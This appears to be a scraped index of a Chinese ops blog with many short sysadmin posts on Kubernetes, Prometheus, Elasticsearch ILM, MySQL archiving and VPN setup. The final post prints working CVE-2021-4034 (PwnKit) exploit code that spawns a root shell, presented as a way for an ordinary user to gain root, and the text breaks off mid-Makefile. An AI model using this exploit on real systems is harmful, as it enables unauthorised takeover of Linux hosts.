nicolaka/netshoot:v0.1 # start command of the debug container # default ['bash'] command: - '/bin/bash' - '-l' # private docker registry auth kuberntes secret # default registrySecretName is kubectl-debug-registry-secret # default registrySecretNamespace is default #registrySecretName: my-debug-secret #registrySecretNamespace: debug # in agentless mode, you can set the agent pod's resource limits/requests: # default is not set agentCpuRequests: \"\" agentCpuLimits: \"\" agentMemoryRequests: \"\" agentMemoryLimits: \"\" # in fork mode, if you want the copied pod retains the labels of the original pod, you can change this params # format is []string # If not set, this parameter is empty by default (Means that any labels of the original pod are not retained, and the labels of the copied pods are empty.) forkPodRetainLabels: [] # You can disable SSL certificate check when communicating with image registry by # setting registrySkipTLSVerify to true. registrySkipTLSVerify: false # You can set the log level with the verbosity setting verbosity : 0 目前遇到一个问题，进入的shell会发生错乱, 和kubecolor有关系。 ","date":"2022-08-09 15:16","objectID":"/post/2878/:0:4","tags":["k8s"],"title":"kubectl debug - 社区方案","uri":"/post/2878/"},{"categories":["监控"],"content":"大致思路就是每分钟从mysql获取当天任务执行情况,成功和失败的指标都会加1(Counter类型)，使用下面的表判断如果检查过了，就不再给时间序列的样本加1，没检查过的才会加1。 所以我们通过increase(zeus_job_failed_total{}[1h]) \u003e 0这个表达式就可以获取到是否有任务失败了 CREATE TABLE `zeus_exporter` ( `id` bigint(20) NOT NULL AUTO_INCREMENT, `job_id` int(8) NOT NULL DEFAULT '0', `start_time` datetime DEFAULT NULL, `check` int(4) DEFAULT NULL, PRIMARY KEY (`id`) ) DEFAULT CHARSET=utf8 vim zeus_exporter.py import time from datetime import date from prometheus_client import start_http_server, Counter import pymysql c_success = Counter(\"zeus_job_success\", 'zeus job success ststus', [\"job_id\", \"job_name\"]) c_failed = Counter(\"zeus_job_failed\", 'zeus job failed ststus', [\"job_id\", \"job_name\"]) conn = pymysql.Connection(host=\"127.0.0.1\", user=\"zeus\", db=\"zeus\", password=\"zeus\") conn.select_db(\"zeus\") def exec_sql(sql): cursor = conn.cursor() cursor.execute(sql) cursor.close() return cursor.fetchall() def init_counter(): \"\"\"这里主要是防止counter重置导致告警误报，所以对计数进行了持久化\"\"\" sql = \"\"\"select count(res.job_id),res.*, zeus_exporter.check from zeus_exporter join (select zeus_job_history.job_id,zeus_job.name,zeus_job_history.status,zeus_job_history.start_time from zeus_job join zeus_job_history on zeus_job.id = zeus_job_history.job_id )res on zeus_exporter.job_id = res.job_id and date(zeus_exporter.start_time)=date(res.start_time) where zeus_exporter.check=1 group by job_id,status; \"\"\" for row in exec_sql(sql): if row[3] == \"success\": c_success.labels(row[1], row[2]).inc(row[0]) elif row[3] == \"failed\": c_failed.labels(row[1], row[2]).inc(row[0]) def get_history_job(): sql_history = \"\"\"select res.*, zeus_exporter.check from zeus_exporter right join ( select zeus_job_history.job_id,zeus_job.name,zeus_job_history.status,zeus_job_history.start_time from zeus_job right join zeus_job_history on zeus_job.id = zeus_job_history.job_id where date(zeus_job_history.start_time)='%s')res on zeus_exporter.job_id = res.job_id and date(zeus_exporter.start_time)=date(res.start_time); \"\"\" % date.today() return exec_sql(sql_history) def set_metrics(): for row in get_history_job(): if row[4] is None: sql_i = 'insert into zeus_exporter(`job_id`,`start_time`,`check`) values(%s,\"%s\",%s)' % (row[0], row[3], 1) exec_sql(sql_i) if row[2] == \"success\" and row[4] != 1: c_success.labels(row[0], row[1]).inc(1) elif row[2] == \"failed\" and row[4] != 1: c_failed.labels(row[0], row[1]).inc(1) if __name__ == '__main__': start_http_server(8000) init_counter() while True: set_metrics() time.sleep(60) ","date":"2022-08-08 20:48","objectID":"/post/2876/:0:0","tags":["prometheus"],"title":"使用prometheus监控zeus任务","uri":"/post/2876/"},{"categories":["其他","基础内容","常用命令"],"content":"从logstash grok里扒出来的 https://raw.githubusercontent.com/logstash-plugins/logstash-patterns-core/main/patterns/legacy/grok-patterns ((([0-9A-Fa-f]{1,4}:){7}([0-9A-Fa-f]{1,4}|:))|(([0-9A-Fa-f]{1,4}:){6}(:[0-9A-Fa-f]{1,4}|((25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)(\\.(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){5}(((:[0-9A-Fa-f]{1,4}){1,2})|:((25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)(\\.(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){4}(((:[0-9A-Fa-f]{1,4}){1,3})|((:[0-9A-Fa-f]{1,4})?:((25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)(\\.(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){3}(((:[0-9A-Fa-f]{1,4}){1,4})|((:[0-9A-Fa-f]{1,4}){0,2}:((25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)(\\.(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){2}(((:[0-9A-Fa-f]{1,4}){1,5})|((:[0-9A-Fa-f]{1,4}){0,3}:((25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)(\\.(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){1}(((:[0-9A-Fa-f]{1,4}){1,6})|((:[0-9A-Fa-f]{1,4}){0,4}:((25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)(\\.(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)){3}))|:))|(:(((:[0-9A-Fa-f]{1,4}){1,7})|((:[0-9A-Fa-f]{1,4}){0,5}:((25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)(\\.(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)){3}))|:)))(%.+)? 如果你要在netscaler上匹配ipv6地址，可以使用下面的这个 (?:(?:(?:[0-9A-Fa-f]{1,4}:){7}(?:[0-9A-Fa-f]{1,4}|:))|(?:(?:[0-9A-Fa-f]{1,4}:){6}(?::[0-9A-Fa-f]{1,4}|(?:(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)(?:\\.(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)){3})|:))|(?:(?:[0-9A-Fa-f]{1,4}:){5}(?:((?::[0-9A-Fa-f]{1,4}){1,2})|:(?:(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)(?:\\.(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)){3})|:))|(?:(?:[0-9A-Fa-f]{1,4}:){4}(?:((?::[0-9A-Fa-f]{1,4}){1,3})|(?:(:[0-9A-Fa-f]{1,4})?:(?:(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)(?:\\.(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)){3}))|:))|(?:(?:[0-9A-Fa-f]{1,4}:){3}(?:((?::[0-9A-Fa-f]{1,4}){1,4})|(?:(:[0-9A-Fa-f]{1,4}){0,2}:(?:(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)(?:\\.(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)){3}))|:))|(?:(?:[0-9A-Fa-f]{1,4}:){2}(?:((?::[0-9A-Fa-f]{1,4}){1,5})|(?:(:[0-9A-Fa-f]{1,4}){0,3}:(?:(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)(?:\\.(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)){3}))|:))|(?:(?:[0-9A-Fa-f]{1,4}:){1}(?:(?:(?::[0-9A-Fa-f]{1,4}){1,6})|(?:(?::[0-9A-Fa-f]{1,4}){0,4}:(?:(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)(?:\\.(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)){3}))|:))|(?::(?:(?:(?::[0-9A-Fa-f]{1,4}){1,7})|(?:(:[0-9A-Fa-f]{1,4}){0,5}:(?:(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)(?:\\.(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)){3}))|:))) 测试用例 # TEST: 1:2:3:4:5:6:7:8 # TEST: 1:: 1:2:3:4:5:6:7:: # TEST: 1::8 1:2:3:4:5:6::8 1:2:3:4:5:6::8 # TEST: 1::7:8 1:2:3:4:5::7:8 1:2:3:4:5::8 # TEST: 1::6:7:8 1:2:3:4::6:7:8 1:2:3:4::8 # TEST: 1::5:6:7:8 1:2:3::5:6:7:8 1:2:3::8 # TEST: 1::4:5:6:7:8 1:2::4:5:6:7:8 1:2::8 # TEST: 1::3:4:5:6:7:8 1::3:4:5:6:7:8 1::8 # TEST: ::2:3:4:5:6:7:8 ::2:3:4:5:6:7:8 ::8 :: # TEST: fe08::7:8%eth0 fe08::7:8%1 # TEST: ::255.255.255.255 ::ffff:255.255.255.255 ::ffff:0:255.255.255.255 # TEST: 2001:db8:3:4::192.0.2.33 64:ff9b::192.0.2.33 # TEST: fe80::7:8%eth0 fe80::7:8%1 # TEST: ::255.255.255.255 ::ffff:255.255.255.255 ::ffff:0:255.255.255.255 # TEST: 2001:db8:3:4::192.0.2.33 64:ff9b::192.0.2.33 参考 https://stackoverflow.com/questions/53497/regular-expression-that-matches-valid-ipv6-addresses https://gist.github.com/syzdek/6086792 ","date":"2022-08-05 19:43","objectID":"/post/2875/:0:0","tags":["ipv6"],"title":"正则匹配ipv6地址+测试用例","uri":"/post/2875/"},{"categories":["kubernetes"],"content":"最近从其他地方迁移过来一个没人维护的服务,容器化后跑在k8s上, 都配置完后发现无法正常访问,看日志说没获取到token,心想可能是nginx代理这块丢失了header信息。 ingress配置如下 apiVersion: extensions/v1beta1 kind: Ingress metadata: annotations: kubernetes.io/ingress.class: nginx nginx.ingress.kubernetes.io/backend-protocol: \"HTTPS\" name: xxxx namespace: arch spec: rules: - host: app.xxx.cn http: paths: - backend: serviceName: xxx-service servicePort: 443 path: / 证实一下,跳过ingress直接通过访问pod和svc访问 k -n arch port-forward --address 0.0.0.0 xxx-service-575cc8dc76-sftz9 443:443 k -n arch port-forward --address 0.0.0.0 service/xxx-service 443:443 测试完发现都是没问题的。 最终原因就是请求头里包含了下划线，nginx默认是会忽略下划线的，所以导致后端读取header会找不到。 解决方式有两个，一个是全局开启识别下划线，一个是指定的ingress用注解开启。 全局开启 k edit cm -n kube-system nginx-configuration # 增加如下内容 enable-underscores-in-headers: enabled 需要重启ingress-controller 使用注解 annotations: kubernetes.io/ingress.class: nginx nginx.ingress.kubernetes.io/server-snippet: | underscores_in_headers on; ","date":"2022-07-29 14:17","objectID":"/post/2868/:0:0","tags":["k8s"],"title":"nginx-ingress丢失header问题","uri":"/post/2868/"},{"categories":["其他"],"content":"备忘 # 将路由信息推送到客户端 push \"route 172.30.0.0 255.255.254.0\" # 注释掉下面这行 # push \"redirect-gateway def1 bypass-dhcp\" ","date":"2022-07-25 13:49","objectID":"/post/2865/:0:0","tags":[],"title":"openvpn仅路由内网","uri":"/post/2865/"},{"categories":["kubernetes"],"content":"备忘 k run python3-test -it --rm=true --restart=Never --image python:3.7-alpine3.16 -- sh ","date":"2022-07-20 17:52","objectID":"/post/2864/:0:0","tags":["k8s"],"title":"kubectl创建pod","uri":"/post/2864/"},{"categories":["databases"],"content":"datax是插件机制的,一般插件支持读写，比如mysql，某些插件支持只写比如es的。 插件文档: https://github.com/alibaba/DataX#support-data-channels mysql -\u003e mysql示例 { \"core\": { \"transport\": { \"channel\": { \"speed\": { \"byte\": 10485760 } } } }, \"job\": { \"setting\": { \"speed\": { \"channel\": 10 } }, \"content\": [ { \"reader\": { \"name\": \"mysqlreader\", \"parameter\": { \"username\": \"root\", \"password\": \"123456\", \"column\": [\"uid\"], # 要同步哪一列 \"splitPk\": \"id\", # 主键字段,单通道同步可以不设置 \"connection\": [ # 要同步的表和库的信息 { \"table\": [\"user\"], \"jdbcUrl\": [\"jdbc:mysql://xxx:3306/xxx\"] } ] } }, \"writer\": { \"name\": \"mysqlwriter\", \"parameter\": { \"writeMode\": \"insert\", \"username\": \"chaoge_log\", \"password\": \"SimpleLog\", \"column\": [\"newuid\"], # 目标表中的字段名 \"connection\": [ # 目标表和库的信息 { \"jdbcUrl\": \"jdbc:mysql://xxx:3306/xxx\", \"table\": [\"user\"] } ] } } } ] } } 开始 python ./bin/datax.py conf/xxx.json ","date":"2022-07-15 14:47","objectID":"/post/2862/:0:0","tags":["mysql","datax"],"title":"datax抽数","uri":"/post/2862/"},{"categories":["ELK日志收集"],"content":"操作步骤 实战为主,没有讲相关概念 创建policy，定义不同阶段对应的不同动作 创建索引模板并和生命周期策略绑定 创建索引 测试ILM执行 ","date":"2022-07-07 21:28","objectID":"/post/2858/:0:1","tags":["elasticsearch"],"title":"ElasticSearch ILM索引生命周期实践 - 日志场景","uri":"/post/2858/"},{"categories":["ELK日志收集"],"content":"一、创建policy 这里根据日志的场景来做配置,一般只考虑三个阶段热、暖或冷、删除，下面用了warm没有用cold PUT _ilm/policy/test-logs { \"policy\": { \"phases\": { \"hot\": { \"min_age\" : \"0m\", \"actions\": { \"set_priority\": { \"priority\": 100 } } }, \"warm\": { \"min_age\": \"1m\", \"actions\": { \"set_priority\" : { \"priority\": 50 }, \"allocate\" : { \"number_of_replicas\": 0, \"require\" : { \"box_type\": \"warm\" } }, \"forcemerge\" : { \"max_num_segments\": 1, \"index_codec\": \"best_compression\" } } }, \"delete\": { \"min_age\": \"2m\", \"actions\": { \"delete\": {} } } } } } 对于min_age参数的理解: 设置为1m的时候代表索引被创建至少1m才会进入当前阶段执行后续动作,否则还会处于上一个阶段。 hot: 索引被创建后立刻进入热阶段(因为min_age=0ms)，进入后执行action，设置索引优先级为100。 warm: 进入warm阶段需要索引的min_age=1m，满足后执行动作，设置索引优先级为50，设置副本为0,索引分配给warm节点(需要自行设置node.attr.box_type),执行ForceMerge操作将segment合并为1个，并且使用best_compression压缩数据，这个比默认的LZ4压缩比更高,但搜索性能差 delete: 等待索引创建至今满足2m(min_age=2m)后，进入delete阶段，执行删除索引操作 ","date":"2022-07-07 21:28","objectID":"/post/2858/:0:2","tags":["elasticsearch"],"title":"ElasticSearch ILM索引生命周期实践 - 日志场景","uri":"/post/2858/"},{"categories":["ELK日志收集"],"content":"二、创建索引模板 下面仅用于测试，生产建议根据自己实际情况修改 PUT _index_template/test-log { \"index_patterns\": [ \"test-log-*\" ], \"template\": { \"settings\": { \"index\": { \"routing.allocation.require.box_type\": \"hot\", \"lifecycle\": { \"name\": \"test-logs\" }, \"number_of_shards\": \"5\", \"number_of_replicas\": \"1\" } } } } ","date":"2022-07-07 21:28","objectID":"/post/2858/:0:3","tags":["elasticsearch"],"title":"ElasticSearch ILM索引生命周期实践 - 日志场景","uri":"/post/2858/"},{"categories":["ELK日志收集"],"content":"三、创建索引 创建前可以先准备一下测试脚本,方便查看结果 PUT %3Ctest-log-%7Bnow%2Fd%7D%3E ","date":"2022-07-07 21:28","objectID":"/post/2858/:0:4","tags":["elasticsearch"],"title":"ElasticSearch ILM索引生命周期实践 - 日志场景","uri":"/post/2858/"},{"categories":["ELK日志收集"],"content":"四、测试 官方的API GET test-log-*/_ilm/explain 临时写了个脚本用来测试执行是否符合预期,要使用的话需要修改用户名密码，es地址 grep -Ev 'es-0[1-3]'是过滤我的hot节点，改成过滤你的hot节点即可 #!/bin/bash index_name=\"${1:-default}\" index_exits(){ code=$(curl -s -o /dev/null -w %{http_code} -u elastic:xxx 10.10.101.226:9200/$index_name) [[ $code == 404 ]] \u0026\u0026 return 1 || return 0 } watch_hot(){ create_time=$(curl -s -u elastic:xxx \"10.10.101.226:9200/$index_name/_settings\" | jq -r \".\\\"$index_name\\\".settings.index.creation_date\" | sed 's#...$##') echo \"$(date -d \"@$create_time\" '+%F %H:%M:%S') \u003e\u003e 索引被创建\" } watch_warm(){ while true; do curl -s -u elastic:xxx 10.10.101.226:9200/_cat/shards/$index_name | awk '$3==\"p\"{print $NF}' | grep -Ev 'es-0[1-3]' \u0026\u003e /dev/null if [[ $? -eq 0 ]] then echo \"$(date '+%F %H:%M:%S') \u003e\u003e 分片被分配到warm节点\" break fi sleep 1 done } watch_delete(){ while true; do index_exits if [[ $? -eq 1 ]] then echo \"$(date '+%F %H:%M:%S') \u003e\u003e 索引被删除\" break fi sleep 1 done } index_exits if [[ $? -eq 0 ]] then watch_hot watch_warm watch_delete else echo \"索引不存在\" fi 执行脚本 sh es_ilm_watch.sh test-log-2022.07.07 最终效果 93929-dwce4zz01ur.png ","date":"2022-07-07 21:28","objectID":"/post/2858/:0:5","tags":["elasticsearch"],"title":"ElasticSearch ILM索引生命周期实践 - 日志场景","uri":"/post/2858/"},{"categories":["ELK日志收集"],"content":"PS: 可能你测试下来会发现并不符合预期,因为我也碰到了。 是什么原因导致的呢？这里需要修改一个参数indices.lifecycle.poll_interval，这是一个集群级别的配置，用来控制ILM多久检查一次索引是否符合ILM策略的频率，默认是10m。 一般情况不需要修改这个参数，但是我上面设置的参数远小于10m，所以要想测试成功，还需要手动将检查间隔改为1s来测试 PUT /_cluster/settings { \"transient\" : { \"indices.lifecycle.poll_interval\" : \"1s\" } } 测试没问题就可以关掉了 PUT /_cluster/settings { \"transient\" : { \"indices.lifecycle.poll_interval\" : null } } ","date":"2022-07-07 21:28","objectID":"/post/2858/:0:6","tags":["elasticsearch"],"title":"ElasticSearch ILM索引生命周期实践 - 日志场景","uri":"/post/2858/"},{"categories":["其他"],"content":"https://www.tecmint.com/setup-ipsec-vpn-with-strongswan-on-debian-ubuntu/ yum install -y strongswan 修改/etc/strongswan/ipsec.conf left conn atou left=172.30.1.140 leftsubnet=172.30.0.1/23 right=对端公网ip rightsubnet=10.23.40.0/24 leftid=ali rightid=ucloud esp=3des-sha type=tunnel leftauth=psk rightauth=psk keyexchange=ikev2 auto=start right conn utoa left=10.23.40.38 leftsubnet=10.23.40.0/24 right=对端公网ip rightsubnet=172.30.0.1/23 leftid=ucloud rightid=ali esp=3des-sha type=tunnel leftauth=psk rightauth=psk keyexchange=ikev2 auto=start /etc/strongswan/ipsec.secrets ucloud ali : PSK \"123@123\" ","date":"2022-07-04 10:03","objectID":"/post/2855/:0:0","tags":[],"title":"使用strongswan搭建ipsec隧道","uri":"/post/2855/"},{"categories":["kubernetes"],"content":"主要是备忘,前提要有alicloud-nas-controller apiVersion: storage.k8s.io/v1 kind: StorageClass metadata: name: alicloud-nas-devops mountOptions: - nolock,tcp,noresvport - vers=4 parameters: server: xxx.xxx.nas.aliyuncs.com:/ volumeAs: subpath archiveOnDelete: \"true\" provisioner: alicloud/nas reclaimPolicy: Delete volumeBindingMode: Immediate pvc测试 apiVersion: v1 kind: PersistentVolumeClaim metadata: labels: app: test name: test spec: accessModes: - ReadWriteOnce resources: requests: storage: 1Gi storageClassName: alicloud-nas-devops volumeMode: Filesystem ","date":"2022-06-27 18:53","objectID":"/post/2854/:0:0","tags":[],"title":"配置ack的nas storageclass","uri":"/post/2854/"},{"categories":["监控"],"content":"项目: https://github.com/utkuozdemir/nvidia_gpu_exporter wget https://github.com/utkuozdemir/nvidia_gpu_exporter/releases/download/v0.3.0/nvidia_gpu_exporter_0.3.0_linux_x86_64.tar.gz tar xf nvidia_gpu_exporter_0.3.0_linux_x86_64.tar.gz nohup ./nvidia_gpu_exporter \u0026 52854-g5jcf6ww2zs.png grafana相对于原作的增加了Instance维度 { \"annotations\": { \"list\": [ { \"builtIn\": 1, \"datasource\": \"-- Grafana --\", \"enable\": true, \"hide\": true, \"iconColor\": \"rgba(0, 211, 255, 1)\", \"name\": \"Annotations \u0026 Alerts\", \"target\": { \"limit\": 100, \"matchAny\": false, \"tags\": [], \"type\": \"dashboard\" }, \"type\": \"dashboard\" } ] }, \"description\": \"Nvidia GPU Metrics based on the prometheus metrics from github.com/utkuozdemir/nvidia_gpu_exporter\", \"editable\": true, \"fiscalYearStartMonth\": 0, \"gnetId\": 14574, \"graphTooltip\": 0, \"id\": 537, \"iteration\": 1656057019477, \"links\": [], \"liveNow\": false, \"panels\": [ { \"datasource\": \"prometheus\", \"description\": \"The official product name of the GPU. This is an alphanumeric string. For all products.\", \"fieldConfig\": { \"defaults\": { \"color\": { \"mode\": \"thresholds\" }, \"decimals\": 2, \"mappings\": [], \"thresholds\": { \"mode\": \"absolute\", \"steps\": [ { \"color\": \"green\", \"value\": null } ] }, \"unit\": \"none\" }, \"overrides\": [] }, \"gridPos\": { \"h\": 3, \"w\": 4, \"x\": 0, \"y\": 0 }, \"id\": 23, \"options\": { \"colorMode\": \"value\", \"graphMode\": \"none\", \"justifyMode\": \"auto\", \"orientation\": \"auto\", \"reduceOptions\": { \"calcs\": [ \"last\" ], \"fields\": \"\", \"values\": false }, \"text\": {}, \"textMode\": \"name\" }, \"pluginVersion\": \"8.2.2\", \"targets\": [ { \"exemplar\": true, \"expr\": \"nvidia_smi_gpu_info{uuid=\\\"$gpu\\\"}\", \"instant\": true, \"interval\": \"\", \"legendFormat\": \"{{name}}\", \"refId\": \"A\" } ], \"timeFrom\": null, \"timeShift\": null, \"title\": \"Name\", \"type\": \"stat\" }, { \"datasource\": \"prometheus\", \"description\": \"The current performance state for the GPU. States range from P0 (maximum performance) to P12 (minimum performance).\", \"fieldConfig\": { \"defaults\": { \"color\": { \"mode\": \"thresholds\" }, \"decimals\": 0, \"mappings\": [ { \"options\": { \"\": { \"text\": \"\" } }, \"type\": \"value\" } ], \"thresholds\": { \"mode\": \"absolute\", \"steps\": [ { \"color\": \"green\", \"value\": null } ] }, \"unit\": \"prefix:P\" }, \"overrides\": [] }, \"gridPos\": { \"h\": 3, \"w\": 2, \"x\": 4, \"y\": 0 }, \"id\": 22, \"options\": { \"colorMode\": \"value\", \"graphMode\": \"none\", \"justifyMode\": \"auto\", \"orientation\": \"auto\", \"reduceOptions\": { \"calcs\": [ \"last\" ], \"fields\": \"\", \"values\": false }, \"text\": {}, \"textMode\": \"value\" }, \"pluginVersion\": \"8.2.2\", \"targets\": [ { \"exemplar\": true, \"expr\": \"nvidia_smi_pstate{uuid=\\\"$gpu\\\"}\", \"interval\": \"\", \"legendFormat\": \"\", \"refId\": \"A\" } ], \"timeFrom\": null, \"timeShift\": null, \"title\": \"P-State\", \"type\": \"stat\" }, { \"datasource\": \"prometheus\", \"description\": \"Percent of time over the past sample period during which one or more kernels was executing on the GPU.\\nThe sample period may be between 1 second and 1/6 second depending on the product.\", \"fieldConfig\": { \"defaults\": { \"color\": { \"mode\": \"thresholds\" }, \"mappings\": [], \"max\": 1, \"min\": 0, \"thresholds\": { \"mode\": \"percentage\", \"steps\": [ { \"color\": \"green\", \"value\": null }, { \"color\": \"#EAB839\", \"value\": 70 }, { \"color\": \"red\", \"value\": 90 } ] }, \"unit\": \"percentunit\" }, \"overrides\": [] }, \"gridPos\": { \"h\": 5, \"w\": 3, \"x\": 6, \"y\": 0 }, \"id\": 6, \"options\": { \"orientation\": \"auto\", \"reduceOptions\": { \"calcs\": [ \"last\" ], \"fields\": \"\", \"values\": false }, \"showThresholdLabels\": false, \"showThresholdMarkers\": true, \"text\": {} }, \"pluginVersion\": \"8.2.2\", \"targets\": [ { \"exemplar\": true, \"expr\": \"nvidia_smi_utilization_gpu_ratio{uuid=\\\"$gpu\\\"}\", \"interval\": \"\", \"legendFormat\": \"{{uuid}}\", \"refId\": \"A\" } ], \"title\": \"GPU Utilization %\", \"transformations\": [], \"type\": \"gauge\" }, { \"datasource\": \"prometheus\", \"description\": \"The last measured power draw for the entire board, in watts. Only available if power management is supported. This reading is accurate to within +/- 5 watts / The software power limit in watts.\", \"fieldConfig\": { \"default","date":"2022-06-24 16:13","objectID":"/post/2850/:0:0","tags":[],"title":"nvidia_gpu_exporter部署","uri":"/post/2850/"},{"categories":["其他"],"content":"数据归档 #!/bin/bash # 将table1表到归档库 LAST_TIME=$(date -d -365day \"+%s\") echo ${LAST_TIME} /usr/bin/pt-archiver \\ --source h=1.1.1.1,u=root,p=123456,P=3306,D=db1,t=table1 \\ --dest h=2.2.2.2,u=root,p=123456,P=3306,D=archive_db1,t=table1 \\ --progress 5000 --where 'date \u003c '${LAST_TIME}' ' \\ --charset=UTF8 --limit=1000 --txn-size 1000 \\ --replace --statistics --bulk-delete | tee /tmp/archive.log ","date":"2022-06-19 11:51","objectID":"/post/2848/:0:1","tags":[],"title":"mysql pt-archive数据归档","uri":"/post/2848/"},{"categories":["其他"],"content":"数据清理 #!/bin/bash # 删除归档库里的table1数据 source /etc/profile END_TIME=$(date -d \"2018-12-31 23:59:59\" +%s) DBUSER=\"root\" DBPASS=\"123456\" DBADDR=\"1.1.1.1\" function purge(){ echo \"删除table1 $(date +'%Y-%m-%d %H:%M:%S' -d @$END_TIME) 之前的数据\" /usr/bin/pt-archiver \\ --source h=${DBADDR},u=${DBUSER},p=${DBPASS},P=3306,D=archive_db1,t=table1 \\ --no-check-charset \\ --where \"adlog_date \u003c= '${END_TIME}' \" \\ --limit 1000 --txn-size 1000 --statistics --skip-foreign-key-checks \\ --purge --progress 1000 --statistics | tee /tmp/delete_archive.log } purge ","date":"2022-06-19 11:51","objectID":"/post/2848/:0:2","tags":[],"title":"mysql pt-archive数据归档","uri":"/post/2848/"},{"categories":["databases"],"content":"原创:我的二狗呢 https://blog.51cto.com/lee90 ","date":"2022-06-19 10:43","objectID":"/post/2847/:0:0","tags":["mysql"],"title":"mysql常用统计sql","uri":"/post/2847/"},{"categories":["databases"],"content":"表体积 SELECT curdate() AS INSERT_DATE , CONCAT(table_schema, '.', table_name) AS TB_NAME, table_rows AS ROWS, ROUND(data_length /1024/1024/1024,2) AS DATA_GB, ROUND(index_length /1024/1024/1024,2)AS idx_GB, ROUND((data_length + index_length)/1024/1024/1024 , 2) AS total_size_GB, index_length / data_length AS idxfrac, ROUND((data_length+index_length)/@total_size/1024,2) as pct FROM information_schema.TABLES where table_schema NOT IN ('mysql','test','information_schema','heartbeat','performance_schema') ORDER BY ( data_length + index_length ) DESC LIMIT 10 ; ","date":"2022-06-19 10:43","objectID":"/post/2847/:0:1","tags":["mysql"],"title":"mysql常用统计sql","uri":"/post/2847/"},{"categories":["databases"],"content":"表自增主键使用情况 select curdate() AS INSERT_DATE , table_schema, table_name, column_name, AUTO_INCREMENT, POW(2, CASE data_type WHEN 'tinyint' THEN 7 WHEN 'smallint' THEN 15 WHEN 'mediumint' THEN 23 WHEN 'int' THEN 31 WHEN 'bigint' THEN 63 END+(column_type LIKE '% unsigned'))-1 AS max_int FROM information_schema.tables t JOIN information_schema.columns c USING (table_schema,table_name) WHERE c.extra = 'auto_increment' AND t.TABLE_SCHEMA NOT IN ('information_schema','mysql', 'sys','test','performance_schema') AND t.auto_increment IS NOT NULL ; \" ","date":"2022-06-19 10:43","objectID":"/post/2847/:0:2","tags":["mysql"],"title":"mysql常用统计sql","uri":"/post/2847/"},{"categories":["databases"],"content":"表碎片率top 10 select curdate() AS INSERT_DATE , ENGINE, CONCAT(TABLE_SCHEMA, '.', TABLE_NAME) AS TB_NAME, ROUND(DATA_LENGTH / 1024 / 1024) AS data_length_MB, ROUND(INDEX_LENGTH / 1024 / 1024) AS index_length_MB, ROUND(DATA_FREE / 1024 / 1024) AS data_free_MB, DATA_FREE / (DATA_LENGTH + INDEX_LENGTH) AS ratio_of_fragmentation FROM information_schema.tables WHERE DATA_FREE \u003e 0 AND TABLE_SCHEMA NOT IN ('mysql','test','performance_schema','information_schema','sys') ORDER BY ratio_of_fragmentation DESC LIMIT 10 ; ","date":"2022-06-19 10:43","objectID":"/post/2847/:0:3","tags":["mysql"],"title":"mysql常用统计sql","uri":"/post/2847/"},{"categories":["databases"],"content":"使用这个命令回收表空间，剩余的磁盘空间最好大于等于50% ALTER table xxxx ENGINE=TokuDB ; 查看表空间使用情况 select dictionary_name, bt_size_allocated/1024/1024/1024 as '已分配大小(GB)', bt_size_in_use/1024/1024/1024 AS '已使用大小(GB)' from information_schema.TokuDB_fractal_tree_info order by bt_size_allocated asc; ","date":"2022-06-19 10:30","objectID":"/post/2846/:0:0","tags":["mysql"],"title":"tokudb 表空间回收","uri":"/post/2846/"},{"categories":["其他"],"content":"只有普通用户，忘记了root密码怎么办? 试试这个方式提权吧! github: https://github.com/berdav/CVE-2021-4034 ","date":"2022-06-17 14:40","objectID":"/post/2844/:0:0","tags":[],"title":"CVE-2021-4034 普通用户提权ROOT SHELL漏洞","uri":"/post/2844/"},{"categories":["其他"],"content":"离线执行,代码如下 cve-2021-4034.c #include \u003cunistd.h\u003e int main(int argc, char **argv) { char * const args[] = { NULL }; char * const environ[] = { \"pwnkit.so:.\", \"PATH=GCONV_PATH=.\", \"SHELL=/lol/i/do/not/exists\", \"CHARSET=PWNKIT\", \"GIO_USE_VFS=\", NULL }; return execve(\"/usr/bin/pkexec\", args, environ); } pwnkit.c #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cunistd.h\u003e void gconv(void) { } void gconv_init(void *step) { char * const args[] = { \"/bin/sh\", NULL }; char * const environ[] = { \"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin\", NULL }; setuid(0); setgid(0); execve(args[0], args, environ); exit(0); } Makefile CFLAGS=-Wall TRUE=$(shell which true) .PHONY: all all: pwnkit.so cve-2021-4034 gconv-modules gconvpath .PHONY: clean clean: rm -rf pwnkit.so cve-2021-4034 gconv-modules GCONV_PATH=./ make -C dry-run clean gconv-modules: echo \"module UTF-8// 